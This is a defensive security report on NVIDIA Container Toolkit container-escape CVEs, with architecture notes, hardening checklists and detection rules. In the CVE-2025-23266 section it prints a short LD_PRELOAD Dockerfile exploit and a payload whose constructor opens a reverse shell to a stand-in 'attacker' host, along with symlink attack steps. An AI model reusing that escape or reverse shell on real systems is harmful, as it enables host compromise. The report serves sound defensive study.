# NVIDIA Container Toolkit Security Research Report
## Comprehensive Architecture, Vulnerability Analysis, and Defense Strategies

**Research Date:** October 6, 2025
**Research Purpose:** Defensive security analysis to understand and protect GPU-enabled container systems
**Report Author:** Security Research Team

---

## Executive Summary

This report provides a comprehensive security analysis of the NVIDIA Container Toolkit, a critical infrastructure component enabling GPU access for containerized AI/ML workloads. The toolkit has experienced several critical vulnerabilities (CVSS 9.0) between 2024-2025, including container escape vulnerabilities that allow attackers to gain root access to host systems. This research is intended for defensive security purposes to help organizations understand and protect their GPU-enabled container infrastructure.

**Key Findings:**
- Multiple critical container escape vulnerabilities discovered (CVE-2024-0132, CVE-2025-23266, CVE-2025-23267)
- Affects approximately 37% of cloud environments using NVIDIA Container Toolkit
- Attack vectors include TOCTOU race conditions, OCI hook manipulation, and symbolic link attacks
- Patches available but incomplete patches have created bypass vulnerabilities
- Strong defense-in-depth strategies required beyond simple patching

---

## 1. Architecture Overview

### 1.1 Component Stack

The NVIDIA Container Toolkit consists of three primary components:

#### **A. NVIDIA Container Runtime (`nvidia-container-runtime`)**
- **Function:** Thin wrapper around the native runC runtime
- **Implementation:** Takes OCI runtime spec as input, injects NVIDIA-specific hooks, passes modified spec to native runC
- **Role:** Primary entry point for container runtimes (Docker, containerd, CRI-O)
- **Since Version 1.12.0:** Performs additional OCI runtime spec modifications to inject specific devices and mounts not handled by nvidia-container-cli

#### **B. NVIDIA Container Runtime Hook (`nvidia-container-toolkit`)**
- **Also known as:** nvidia-container-runtime-hook
- **Function:** Executed as a prestart/createContainer OCI hook
- **Implementation:** Parses container config.json, invokes nvidia-container-cli with appropriate flags
- **Privilege Level:** Runs with root privileges on the host
- **Security Critical:** Operates before container security controls are fully in effect

#### **C. NVIDIA Container Library and CLI (`libnvidia-container1`, `nvidia-container-cli`)**
- **Function:** Core library for GPU device injection into containers
- **Implementation:** Uses Linux kernel primitives (namespaces, cgroups, device nodes)
- **Design:** Container runtime agnostic
- **Key Operations:**
  - Device node mounting (/dev/nvidia*, /dev/dri/*)
  - Driver library mounting
  - CUDA library injection
  - GPU device isolation via cgroups

### 1.2 Integration with Container Runtimes

#### **Docker Integration**
```
Docker Engine → nvidia-container-runtime → runC + NVIDIA hooks → libnvidia-container → Container with GPU
```

#### **Containerd/Kubernetes Integration**
```
containerd → nvidia-container-runtime → runC + NVIDIA hooks → libnvidia-container → Container with GPU
```

#### **CRI-O/LXC Integration**
```
CRI-O/LXC → nvidia-container-toolkit (hook only) → libnvidia-container → Container with GPU
```

### 1.3 Package Structure

```
nvidia-container-toolkit (main package)
├── libnvidia-container-tools (>= version)
├── nvidia-container-toolkit-base (version)
└── libnvidia-container1 (version)
```

**Current Stable Version (as of July 2025):** 1.17.8
**GPU Operator Version:** 25.3.1

---

## 2. Device Mounting Mechanisms and GPU Passthrough

### 2.1 GPU Device Injection Process

The toolkit uses a multi-stage process to grant containers access to GPU devices:

#### **Stage 1: Environment Variable Processing**
- Container specifies required GPUs via `NVIDIA_VISIBLE_DEVICES` environment variable
- Examples:
  - `NVIDIA_VISIBLE_DEVICES=all` - Request all GPUs
  - `NVIDIA_VISIBLE_DEVICES=0,1` - Request specific GPUs
  - `NVIDIA_VISIBLE_DEVICES=GPU-UUID` - Request by UUID

#### **Stage 2: OCI Hook Execution**
- nvidia-container-runtime injects OCI hooks into container spec
- Two primary hooks:
  - **prestart hook:** Executed before container starts (legacy)
  - **createContainer hook:** Executed during container creation (newer, more vulnerable)

#### **Stage 3: Device Node Mounting**
nvidia-container-cli mounts required devices into container namespace:

**Device Nodes:**
```
/dev/nvidia0, /dev/nvidia1, ... (GPU devices)
/dev/nvidiactl (control device)
/dev/nvidia-uvm (Unified Virtual Memory)
/dev/nvidia-uvm-tools (UVM tools)
/dev/dri/card* (DRM device nodes)
/dev/dri/renderD* (Render nodes)
```

**Driver Libraries:**
```
/usr/lib/x86_64-linux-gnu/libnvidia-*.so
/usr/lib/x86_64-linux-gnu/libcuda.so
/usr/lib/x86_64-linux-gnu/libnvml.so
```

#### **Stage 4: cgroups-based Isolation**
- Uses Linux device cgroup controller for device access control
- Whitelists specific device major/minor numbers
- Prevents access to non-authorized GPUs

### 2.2 Multi-Instance GPU (MIG) Support

For newer GPUs supporting MIG:
- Individual GPU instances can be isolated
- Separate device nodes per MIG instance
- Enhanced isolation for multi-tenant environments

### 2.3 CUDA Compatibility Libraries

**Historical Behavior (Pre-1.17.0):**
- Toolkit could mount CUDA compat libraries from container image
- Created security vulnerability (CVE-2024-0136, CVE-2024-0137)

**Current Behavior (Post-1.17.0):**
- CUDA compat library mounting from containers disabled by default
- Can be re-enabled with `allow-cuda-compat-libs-from-container` flag (NOT RECOMMENDED)

---

## 3. Container Device Interface (CDI) Specifications

### 3.1 CDI Overview

**Purpose:** Standardize device access across container runtimes
**Specification:** Open standard for complex device injection
**Supported Runtimes:** containerd, CRI-O, podman

### 3.2 CDI Implementation in NVIDIA Toolkit

#### **Specification Files**
**Locations:**
- `/etc/cdi/nvidia.yaml`
- `/var/run/cdi/nvidia.yaml`

**Device Naming Convention:**
```yaml
nvidia.com/gpu=all          # All GPUs
nvidia.com/gpu=0            # GPU 0
nvidia.com/gpu=1            # GPU 1
nvidia.com/gpu=GPU-UUID     # Specific GPU by UUID
nvidia.com/mig=*            # MIG devices
```

#### **CDI Specification Example**
```yaml
cdiVersion: 0.5.0
kind: nvidia.com/gpu
devices:
  - name: "0"
    containerEdits:
      deviceNodes:
        - path: /dev/nvidia0
        - path: /dev/nvidiactl
        - path: /dev/nvidia-uvm
      mounts:
        - hostPath: /usr/lib/x86_64-linux-gnu/libnvidia-*.so
          containerPath: /usr/lib/x86_64-linux-gnu/libnvidia-*.so
      env:
        - NVIDIA_VISIBLE_DEVICES=0
```

### 3.3 CDI Security Advantages

**Important:** CDI mode bypasses some vulnerable code paths
- CVE-2024-0132 does NOT affect CDI-based deployments
- Podman with native CDI support is more secure
- Recommended for new deployments

---

## 4. Known CVEs and Security Advisories

### 4.1 Critical Vulnerabilities

#### **CVE-2024-0132 - TOCTOU Container Escape (September 2024)**

**Severity:** CVSS 9.0 (Critical)
**Type:** Time-of-Check Time-of-Use (TOCTOU) Race Condition
**CWE:** CWE-367

**Technical Details:**
- **Affected Versions:** NVIDIA Container Toolkit ≤ 1.16.1, GPU Operator ≤ 24.6.1
- **Attack Vector:** TOCTOU race condition in libnvidia-container's `mount_files` function
- **Exploitation:** Attacker crafts container image with symbolic links that change between check and use
- **Impact:** Can mount host root filesystem into container, leading to full host compromise

**CVSS Vector:**
```
NIST:     AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (Score: 8.3)
NVIDIA:   AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (Score: 9.0)
```

**Attack Flow:**
1. Attacker creates malicious container image with crafted symlinks
2. Container runtime invokes nvidia-container-toolkit
3. libnvidia-container checks path (e.g., to CUDA library)
4. Between check and use, symlink changes to point to host path
5. libnvidia-container mounts attacker-chosen host path into container
6. Attacker gains access to host filesystem, including /var/run/docker.sock
7. Via docker.sock, attacker launches privileged container
8. Full host compromise achieved

**Remediation:** Upgrade to Container Toolkit ≥ 1.16.2, GPU Operator ≥ 24.6.2

**Incomplete Patch:** Initial patch bypassed by CVE-2025-23359

---

#### **CVE-2025-23266 - "NVIDIAScape" OCI Hook Escape (July 2025)**

**Severity:** CVSS 9.0 (Critical)
**Type:** Environment Variable Injection into Privileged Process
**Discovered by:** Wiz Research

**Technical Details:**
- **Affected Versions:** NVIDIA Container Toolkit ≤ 1.17.7, GPU Operator ≤ 25.3.0
- **Affects:** 37% of cloud environments using NVIDIA Container Toolkit
- **Attack Vector:** createContainer OCI hook inherits container environment variables
- **Exploitation:** LD_PRELOAD environment variable injection

**Attack Mechanism:**
1. OCI spec defines createContainer hook execution during container creation
2. Unlike prestart hooks (isolated), createContainer hooks inherit container environment
3. Hook process (`nvidia-ctk`) runs with root privileges on host
4. Hook's working directory set to container's root filesystem
5. Attacker sets `LD_PRELOAD=./malicious.so` in container image
6. When hook executes, dynamic linker loads attacker's malicious.so with root privileges
7. Attacker code executes on host as root

**Three-Line Exploit:**
```dockerfile
FROM nvidia/cuda:latest
COPY payload.so /payload.so
ENV LD_PRELOAD=/payload.so
```

**payload.so pseudocode:**
```c
__attribute__((constructor))
void exploit(void) {
    // Running as root on host
    system("bash -i >& /dev/tcp/attacker/4444 0>&1");
    // Or: bind mount escape, privilege escalation, etc.
}
```

**Impact:**
- Direct container escape to host
- Root code execution on host
- Full cluster compromise in multi-tenant Kubernetes
- Data exfiltration from co-tenant workloads

**Remediation:** Upgrade to Container Toolkit ≥ 1.17.8, GPU Operator ≥ 25.3.1

---

#### **CVE-2025-23267 - Link Following Vulnerability (July 2025)**

**Severity:** CVSS 8.5 (High)
**Type:** Improper Link Resolution Before File Access
**CWE:** CWE-59

**Technical Details:**
- **Affected Versions:** NVIDIA Container Toolkit ≤ 1.17.7, GPU Operator ≤ 25.3.0
- **Attack Vector:** update-ldcache hook follows symbolic links from container
- **Exploitation:** Craft container with symlinks pointing outside container root

**Attack Mechanism:**
1. update-ldcache hook invokes host's ldconfig with `-r` (chroot) option
2. ldconfig pointed at container's root filesystem
3. Attacker creates symlinks in container image:
   ```
   /etc/ld.so.cache -> /host/etc/ld.so.cache
   /etc/ld.so.conf.d/ -> /host/etc/ld.so.conf.d/
   ```
4. ldconfig follows symlinks and writes to host filesystem
5. Attacker can overwrite /etc/ld.so.cache on host
6. Host's dynamic linker poisoned, can lead to privilege escalation

**Impact:**
- Host file tampering
- Dynamic linker poisoning
- Potential denial of service
- Prerequisite for further privilege escalation

**Remediation:** Upgrade to Container Toolkit ≥ 1.17.8, GPU Operator ≥ 25.3.1

---

#### **CVE-2025-23359 - Bypass of CVE-2024-0132 Patch (April 2025)**

**Severity:** CVSS 9.0 (Critical)
**Type:** Incomplete Patch / Bypass

**Technical Details:**
- Original CVE-2024-0132 patch (v1.16.2) was incomplete
- Researchers discovered alternative exploitation path
- Demonstrated patch bypass
- Fixed in v1.17.4

**Key Insight:** Highlights danger of incomplete security fixes in privileged infrastructure components

**Remediation:** Upgrade to Container Toolkit ≥ 1.17.4

---

#### **CVE-2024-0133 - File Creation on Host (September 2024)**

**Severity:** CVSS 4.1 (Medium)
**Type:** Data Tampering

**Technical Details:**
- **Affected Versions:** NVIDIA Container Toolkit ≤ 1.16.1
- **Impact:** Attacker can create empty files on host filesystem
- **Exploitation:** Specially crafted container images

**Remediation:** Upgrade to Container Toolkit ≥ 1.16.2

---

#### **CVE-2024-0136 and CVE-2024-0137 - ldconfig Misuse (January 2025)**

**Severity:** Variable (depends on configuration)
**Type:** Configuration-dependent code execution

**Technical Details:**
- Only affects non-default configurations
- Vulnerable when toolkit configured to run ldconfig from container's filesystem
- Default configuration (ldconfig from host) not vulnerable

**Vulnerable Configuration:**
```toml
[nvidia-container-cli]
ldconfig = "/sbin/ldconfig"  # VULNERABLE
```

**Secure Configuration:**
```toml
[nvidia-container-cli]
ldconfig = "@/sbin/ldconfig"  # SECURE (@ prefix = host filesystem)
```

**Remediation:**
- Ensure @ prefix in config: `ldconfig = "@/sbin/ldconfig"`
- Upgrade to latest version

---

### 4.2 Security Bulletin Timeline

| Date | Bulletin | CVEs | Critical CVEs |
|------|----------|------|---------------|
| July 2025 | NVIDIA Container Toolkit - July 2025 | CVE-2025-23266, CVE-2025-23267 | 1 |
| April 2025 | Incomplete Patch Advisory | CVE-2025-23359 | 1 |
| February 2025 | NVIDIA Container Toolkit - February 2025 | - | - |
| January 2025 | NVIDIA Container Toolkit - January 2025 | CVE-2024-0136, CVE-2024-0137 | 0 |
| September 2024 | NVIDIA Container Toolkit - September 2024 | CVE-2024-0132, CVE-2024-0133 | 1 |

---

## 5. Security Model and Isolation Mechanisms

### 5.1 Intended Security Boundaries

The NVIDIA Container Toolkit relies on the following Linux kernel isolation primitives:

#### **Namespaces**
- **PID Namespace:** Process isolation
- **Network Namespace:** Network stack isolation
- **Mount Namespace:** Filesystem isolation
- **User Namespace:** UID/GID mapping (limited use)

#### **Cgroups**
- **Device cgroup:** Controls access to device nodes
- **Memory cgroup:** GPU memory limits (limited support)
- **CPU cgroup:** CPU allocation for GPU workloads

#### **Capabilities**
Containers typically run without:
- CAP_SYS_ADMIN
- CAP_SYS_MODULE
- CAP_SYS_RAWIO

However, GPU access may require relaxing some restrictions.

### 5.2 Security Boundary Weaknesses

**Critical Weaknesses Identified:**

#### **1. Privileged Hook Execution**
- OCI hooks run with full root privileges on host
- Execute before container security controls active
- Have direct access to host filesystem
- Inherit environment from untrusted container images (createContainer hook)

#### **2. Shared Kernel Driver**
- GPU driver (nvidia.ko) runs in host kernel
- All containers share same driver
- Driver bugs affect host and all containers
- No driver-level isolation between containers

#### **3. Device Node Access**
- Containers get direct access to /dev/nvidia* devices
- Direct memory-mapped I/O to GPU
- GPU firmware can contain vulnerabilities
- No hardware-enforced isolation (except MIG)

#### **4. Filesystem Mounting During Privileged Phase**
- Hooks mount host paths into container
- TOCTOU vulnerabilities in path resolution
- Symlink attacks possible
- Race conditions between check and mount

### 5.3 SELinux Integration

NVIDIA provides custom SELinux policies:
- Allows GPU access while maintaining isolation
- Prevents many privilege escalation paths
- **Recommended:** Enable SELinux in enforcing mode for GPU containers

**SELinux Context Example:**
```
nvidia_container_t
```

**Policy Allows:**
- Access to /dev/nvidia* devices
- Loading specific GPU libraries
- Communication with X server (if needed)

**Policy Denies:**
- Access to non-GPU devices
- Arbitrary kernel module loading
- Direct filesystem access outside container

### 5.4 Defense-in-Depth Model

**Containers alone are NOT a strong security boundary.**

NVIDIA and security researchers recommend:

1. **Virtualization Layer:** Run containers inside VMs for strong isolation
2. **Network Segmentation:** Isolate GPU workloads on separate networks
3. **Image Scanning:** Scan all container images for malicious content
4. **Admission Control:** Use Kubernetes admission controllers to validate containers
5. **Runtime Monitoring:** Detect anomalous behavior in running containers
6. **Principle of Least Privilege:** Minimize container permissions

---

## 6. Attack Surfaces and Threat Model

### 6.1 Attack Surface Analysis

#### **Primary Attack Surfaces:**

**A. Container Image Supply Chain**
- **Threat:** Malicious container images with exploits
- **Examples:**
  - Images with crafted symlinks (CVE-2024-0132)
  - Images with LD_PRELOAD payloads (CVE-2025-23266)
  - Images with malicious CUDA compat libraries (CVE-2024-0136)
- **Affected Component:** All components (runtime, hooks, CLI)

**B. OCI Hook Mechanism**
- **Threat:** Environment variable injection, race conditions
- **Examples:**
  - createContainer hook environment inheritance
  - Prestart hook TOCTOU vulnerabilities
- **Affected Component:** nvidia-container-toolkit (hooks)

**C. Configuration Files**
- **Threat:** Misconfiguration leading to vulnerabilities
- **Examples:**
  - ldconfig path without @ prefix
  - Enabling allow-cuda-compat-libs-from-container
- **Affected Component:** /etc/nvidia-container-runtime/config.toml

**D. GPU Driver Interface**
- **Threat:** Driver bugs, firmware vulnerabilities
- **Examples:**
  - NVIDIA kernel driver CVEs (separate from Container Toolkit)
  - GPU firmware exploits
- **Affected Component:** nvidia.ko kernel driver

**E. Device Node Access**
- **Threat:** Direct hardware access from compromised container
- **Examples:**
  - GPU memory corruption
  - DMA attacks (limited by IOMMU)
- **Affected Component:** /dev/nvidia*, /dev/dri/*

**F. Shared Library Injection**
- **Threat:** Malicious libraries loaded into privileged processes
- **Examples:**
  - CUDA library replacement
  - Driver library tampering
- **Affected Component:** libnvidia-container, nvidia-container-cli

### 6.2 Threat Actors and Scenarios

#### **Scenario 1: Malicious Tenant in Cloud Environment**
- **Attacker:** Customer with legitimate cloud account
- **Goal:** Escape container, access other tenants' data
- **Method:** Upload malicious container image with CVE-2025-23266 exploit
- **Impact:** Full cluster compromise, cross-tenant data breach
- **Likelihood:** High (37% of environments affected)

#### **Scenario 2: Supply Chain Attack**
- **Attacker:** Compromise of public container registry (Docker Hub, etc.)
- **Goal:** Distribute malicious ML framework images
- **Method:** Inject exploits into popular CUDA/PyTorch/TensorFlow images
- **Impact:** Mass compromise of AI infrastructure
- **Likelihood:** Medium (requires upstream compromise)

#### **Scenario 3: Insider Threat**
- **Attacker:** Malicious developer with container push access
- **Goal:** Establish persistent backdoor on GPU infrastructure
- **Method:** Submit container with embedded exploit as "GPU benchmark"
- **Impact:** Long-term access to sensitive AI training data and models
- **Likelihood:** Medium (depends on organization controls)

#### **Scenario 4: Privilege Escalation from Compromised Container**
- **Attacker:** Already compromised a container via application vulnerability
- **Goal:** Escalate from container to host
- **Method:** Drop exploit binary, execute local container escape
- **Impact:** Host compromise, lateral movement
- **Likelihood:** High (common attacker progression)

### 6.3 Attack Prerequisites

For successful exploitation:
1. **Container Execution:** Ability to run containers on target system
2. **NVIDIA Runtime:** System must use nvidia-container-runtime
3. **Vulnerable Version:** Container Toolkit version ≤ 1.17.7 (for latest CVEs)
4. **GPU Request:** Container must request GPU access (NVIDIA_VISIBLE_DEVICES)

**Note:** Some CVEs (like CVE-2025-23266) only require CDI mode since v1.17.5, expanding attack surface.

---

## 7. Common Misconfigurations Leading to Container Escapes

### 7.1 Critical Misconfigurations

#### **1. Using Outdated Versions**
**Misconfiguration:**
```bash
$ nvidia-container-toolkit --version
NVIDIA Container Toolkit 1.16.0
```

**Risk:** Vulnerable to all known CVEs
**Fix:** Upgrade to ≥ 1.17.8

---

#### **2. Incorrect ldconfig Configuration**
**Misconfiguration:**
```toml
# /etc/nvidia-container-runtime/config.toml
[nvidia-container-cli]
ldconfig = "/sbin/ldconfig"  # WRONG - no @ prefix
```

**Risk:** Vulnerable to CVE-2024-0136, CVE-2024-0137
**Fix:**
```toml
[nvidia-container-cli]
ldconfig = "@/sbin/ldconfig"  # CORRECT - @ prefix for host path
```

---

#### **3. Allowing CUDA Compat Libraries from Containers**
**Misconfiguration:**
```toml
[nvidia-container-runtime]
feature-flags = ["allow-cuda-compat-libs-from-container"]
```

**Risk:** Re-enables vulnerabilities patched in 1.17.0
**Fix:** Remove this flag, use host-provided CUDA compat libraries

---

#### **4. Running Privileged Containers with GPU Access**
**Misconfiguration:**
```bash
docker run --privileged --gpus all untrusted-image
```

**Risk:** Bypasses container isolation entirely
**Fix:** Never use --privileged with untrusted images; use --gpus without --privileged

---

#### **5. Not Using Image Admission Control**
**Misconfiguration:** Kubernetes cluster allows any container image to run

**Risk:** Malicious images can exploit GPU runtime
**Fix:** Implement admission controllers (OPA, Kyverno) to validate images

Example Kyverno policy:
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-signed-gpu-images
spec:
  validationFailureAction: enforce
  rules:
  - name: check-gpu-image-signature
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "GPU containers must use signed images from approved registry"
      pattern:
        spec:
          containers:
          - (resources.limits."nvidia.com/gpu"): ">0"
            image: "registry.company.com/*"
```

---

#### **6. Unrestricted NVIDIA_VISIBLE_DEVICES**
**Misconfiguration:** Allowing unprivileged containers to set NVIDIA_VISIBLE_DEVICES arbitrarily

**Risk:** Bypasses Kubernetes device plugin resource limits
**Fix:** Configure toolkit to ignore NVIDIA_VISIBLE_DEVICES for unprivileged containers

```toml
[nvidia-container-runtime]
mode = "device-plugin"
```

---

#### **7. Insufficient Network Segmentation**
**Misconfiguration:** GPU containers on same network as critical infrastructure

**Risk:** Post-exploit lateral movement
**Fix:** Isolate GPU workload networks, implement microsegmentation

---

#### **8. Disabled SELinux/AppArmor**
**Misconfiguration:**
```bash
$ getenforce
Disabled
```

**Risk:** No MAC-based protection against container escape
**Fix:** Enable SELinux in enforcing mode with NVIDIA policy

```bash
setenforce 1
restorecon -Rv /dev/nvidia*
```

---

#### **9. Mounting Docker Socket into GPU Containers**
**Misconfiguration:**
```bash
docker run --gpus all -v /var/run/docker.sock:/var/run/docker.sock image
```

**Risk:** Direct path to host compromise (even without Container Toolkit CVE)
**Fix:** Never mount docker.sock into containers

---

#### **10. Running Containers as Root**
**Misconfiguration:**
```dockerfile
FROM nvidia/cuda:latest
USER root  # Default, unnecessary
```

**Risk:** Amplifies impact of container escape
**Fix:** Use non-root users in containers (may require kernel user namespaces)

---

### 7.2 Configuration Hardening Checklist

- [ ] Container Toolkit version ≥ 1.17.8
- [ ] GPU Operator version ≥ 25.3.1 (if using Kubernetes)
- [ ] ldconfig configured with @ prefix: `ldconfig = "@/sbin/ldconfig"`
- [ ] CUDA compat feature flag disabled (not in feature-flags)
- [ ] SELinux enabled in enforcing mode
- [ ] Container image scanning enabled in CI/CD
- [ ] Kubernetes admission control policies enforced
- [ ] Network segmentation for GPU workloads
- [ ] No --privileged containers with GPU access
- [ ] No docker.sock mounting
- [ ] Non-root users in container images
- [ ] Regular security updates applied
- [ ] Runtime monitoring and anomaly detection enabled
- [ ] Audit logging configured for container operations

---

## 8. Defense-in-Depth Mitigation Strategies

### 8.1 Immediate Actions (Critical Priority)

#### **1. Patch to Latest Versions**
```bash
# Update Container Toolkit
apt-get update && apt-get install --only-upgrade nvidia-container-toolkit

# Verify version
nvidia-container-toolkit --version
# Should be >= 1.17.8

# For Kubernetes GPU Operator
kubectl apply -f https://raw.githubusercontent.com/NVIDIA/gpu-operator/v25.3.1/deployments/gpu-operator/gpu-operator.yaml
```

#### **2. Validate Configuration**
```bash
# Check ldconfig configuration
grep ldconfig /etc/nvidia-container-runtime/config.toml
# Should show: ldconfig = "@/sbin/ldconfig"

# Check for dangerous feature flags
grep feature-flags /etc/nvidia-container-runtime/config.toml
# Should NOT contain: allow-cuda-compat-libs-from-container
```

#### **3. Restart Container Runtime**
```bash
# Docker
systemctl restart docker

# containerd
systemctl restart containerd

# Verify GPU access still works
docker run --rm --gpus all nvidia/cuda:latest nvidia-smi
```

### 8.2 Short-Term Mitigations (High Priority)

#### **1. Implement Container Image Scanning**

**Trivy Integration:**
```bash
# Scan image before deployment
trivy image --severity HIGH,CRITICAL nvidia/cuda:latest

# CI/CD integration (GitLab CI example)
scan_image:
  stage: security
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity CRITICAL $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
```

**Clair Integration:**
```bash
# Scan with Clair
clairctl analyze nvidia/cuda:latest

# Block high-severity vulnerabilities
clairctl report --severity High nvidia/cuda:latest || exit 1
```

#### **2. Deploy Kubernetes Admission Controllers**

**OPA Gatekeeper Policy:**
```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiresignedgpuimages
spec:
  crd:
    spec:
      names:
        kind: K8sRequireSignedGpuImages
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiresignedgpuimages

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          has_gpu_request(container)
          not is_signed_image(container.image)
          msg := sprintf("GPU container must use signed image: %v", [container.image])
        }

        has_gpu_request(container) {
          container.resources.limits["nvidia.com/gpu"]
        }

        is_signed_image(image) {
          startswith(image, "registry.company.com/")
        }
```

#### **3. Enable Runtime Monitoring**

**Falco Rule for NVIDIA Container Toolkit Exploits:**
```yaml
- rule: Nvidia Container Toolkit Exploit Attempt
  desc: Detects potential exploitation of NVIDIA Container Toolkit vulnerabilities
  condition: >
    spawned_process and
    proc.name in (nvidia-ctk, nvidia-container-cli, nvidia-container-runtime-hook) and
    (proc.env contains "LD_PRELOAD" or
     proc.args contains "--mount" or
     fd.name startswith "/proc/self/")
  output: >
    Potential NVIDIA Container Toolkit exploit detected
    (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container_escape, nvidia, gpu]

- rule: Suspicious Symlink in GPU Container
  desc: Detects creation of symlinks pointing outside container in GPU-enabled containers
  condition: >
    spawned_process and
    container.privileged=false and
    proc.env contains "NVIDIA_VISIBLE_DEVICES" and
    (proc.name = ln and proc.args contains "../") or
    (open_write and fd.name startswith "/proc/")
  output: >
    Suspicious symlink creation in GPU container
    (user=%user.name command=%proc.cmdline file=%fd.name container=%container.name)
  priority: WARNING
  tags: [container_escape, nvidia, gpu]
```

**Deploy Falco:**
```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --set falco.rules_file={/etc/falco/falco_rules.yaml,/etc/falco/nvidia_rules.yaml} \
  --set-file customRules.nvidia_rules.yaml=nvidia_falco_rules.yaml
```

#### **4. Implement Network Segmentation**

**Kubernetes Network Policy:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: gpu-workload-isolation
  namespace: ml-training
spec:
  podSelector:
    matchLabels:
      gpu: "true"
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: ml-training
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: ml-training
  - to:  # Allow external ML dataset access
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 443
```

### 8.3 Medium-Term Hardening (Medium Priority)

#### **1. Implement Image Signing and Verification**

**Sigstore/Cosign:**
```bash
# Sign images
cosign sign --key cosign.key registry.company.com/ml-image:v1.0

# Verify in admission controller
cosign verify --key cosign.pub registry.company.com/ml-image:v1.0
```

**Notary (Docker Content Trust):**
```bash
# Enable DCT
export DOCKER_CONTENT_TRUST=1

# Push signed image
docker push registry.company.com/ml-image:v1.0

# Kubernetes: Use admission webhook to verify signatures
```

#### **2. Deploy Runtime Security Monitoring**

**Sysdig Secure:**
```bash
helm install sysdig-agent sysdig/sysdig \
  --set sysdig.accessKey=YOUR_ACCESS_KEY \
  --set nodeAnalyzer.secure.vulnerabilityManagement.newEngineOnly=true \
  --set nvidia.enabled=true
```

**Aqua Security:**
```yaml
# Enable GPU workload protection
apiVersion: aquasecurity.github.io/v1alpha1
kind: AquaEnforcer
metadata:
  name: gpu-enforcer
spec:
  enforcerMode: enforce
  runtimeType: containerd
  extraEnvVars:
  - name: NVIDIA_GPU_ENABLED
    value: "true"
```

#### **3. Harden Kubernetes RBAC**

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: ml-training
  name: gpu-pod-creator
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list"]
  # Restrict to specific image registries via admission controller
- apiGroups: [""]
  resources: ["pods/log"]
  verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: gpu-pod-creator-binding
  namespace: ml-training
subjects:
- kind: User
  name: data-scientist@company.com
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: gpu-pod-creator
  apiGroup: rbac.authorization.k8s.io
```

#### **4. Enable Comprehensive Audit Logging**

**Kubernetes Audit Policy:**
```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Log all GPU pod creation
- level: RequestResponse
  verbs: ["create", "update", "patch"]
  resources:
  - group: ""
    resources: ["pods"]
  namespaces: ["ml-training", "ml-inference"]
  omitStages:
  - RequestReceived

# Log all privileged operations
- level: RequestResponse
  verbs: ["create", "update", "patch", "delete"]
  resources:
  - group: "policy"
    resources: ["podsecuritypolicies"]
  omitStages:
  - RequestReceived
```

**Docker Audit:**
```bash
# Enable Docker event logging
dockerd --log-level=debug --log-driver=json-file

# Monitor with auditd
auditctl -w /usr/bin/docker -p rwxa -k docker_execution
auditctl -w /var/run/docker.sock -p rwxa -k docker_socket
```

### 8.4 Long-Term Strategic Defenses (Lower Priority)

#### **1. Migrate to CDI Mode**

CDI mode bypasses vulnerable code paths:
```bash
# Generate CDI specs
nvidia-ctk cdi generate --output=/etc/cdi/nvidia.yaml

# Configure runtime to use CDI
# In /etc/nvidia-container-runtime/config.toml:
[nvidia-container-runtime]
mode = "cdi"

# Use in containers
docker run --device nvidia.com/gpu=0 ml-image:latest
```

#### **2. Implement VM-based Isolation**

For highest security multi-tenant environments:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ml-training-kata
spec:
  runtimeClassName: kata-qemu-nvidia
  containers:
  - name: training
    image: ml-framework:latest
    resources:
      limits:
        nvidia.com/gpu: 1
```

**Kata Containers with GPU:**
- Provides VM-level isolation
- GPU passthrough via VFIO
- Stronger security boundary than containers alone

#### **3. Deploy Hardware Security Module (HSM) for Key Material**

Protect container image signing keys:
```bash
# Use HSM for Cosign signing
cosign sign --key yubikey://slot-id registry.company.com/ml-image:v1.0
```

#### **4. Implement Zero Trust Network Architecture**

```
Service Mesh (Istio/Linkerd) → mTLS between all services
Network Policies → Default deny-all
Identity-based Auth → Workload identities (SPIFFE/SPIRE)
```

#### **5. Regular Penetration Testing**

Quarterly red team exercises:
- Attempt container escapes on test clusters
- Test detection capabilities
- Validate incident response procedures

### 8.5 Monitoring and Detection

#### **Key Metrics to Monitor:**

1. **Container Runtime Events:**
   - Container creation with GPU requests
   - Privileged container launches
   - Volume mounts including docker.sock

2. **Process Executions:**
   - nvidia-container-toolkit hook executions
   - nvidia-container-cli invocations with unusual arguments
   - Processes with LD_PRELOAD set

3. **Filesystem Events:**
   - Modifications to /etc/nvidia-container-runtime/config.toml
   - Symlink creation in containers
   - Access to /dev/nvidia* devices

4. **Network Events:**
   - Unexpected outbound connections from GPU containers
   - Connections to container registries (potential image pulling)
   - East-west traffic to non-ML services

5. **Anomaly Detection:**
   - GPU containers with unusual syscall patterns
   - Rapid increase in mount table entries
   - GPU memory usage inconsistent with declared workload

#### **Alerting Thresholds:**

**Critical Alerts (Immediate Response):**
- NVIDIA Container Toolkit process with LD_PRELOAD set
- Privileged container with GPU access
- Container escape indicators (accessing /proc/*/root, etc.)
- Unauthorized modifications to container runtime config

**High Alerts (Response within 1 hour):**
- GPU container attempting to access docker.sock
- Unusual network connections from GPU pods
- High volume of failed container starts
- Symlink creation pointing outside container

**Medium Alerts (Response within 24 hours):**
- Unsigned container image requesting GPU access
